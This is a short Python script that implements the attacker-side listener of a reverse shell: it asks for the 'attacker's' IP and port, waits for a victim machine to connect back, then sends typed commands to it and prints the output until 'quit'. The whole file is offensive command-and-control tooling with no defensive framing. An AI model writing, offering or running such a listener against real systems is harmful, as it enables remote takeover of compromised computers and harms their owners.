import socket

class Listener:
    def __init__(self):
        lhost = input("     Attackers ip addres:")
        lport = int(input("     Port to listen to:"))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((lhost, lport))
        print("[*] Listening for Conections...\n")
        s.listen()
        conn, addr = s.accept()

        print(f"[+] Connected to {addr}")

        while True:
            command = input(">>> ")
            if command != "":
                if command != "quit":
                    conn.send(command.encode())
                    recieved_data = conn.recv(5000).decode()
                    print(recieved_data)
                else:
                    conn.close()
                    print("\n[-] Connection Closed!\n")
                    break
            else:
                pass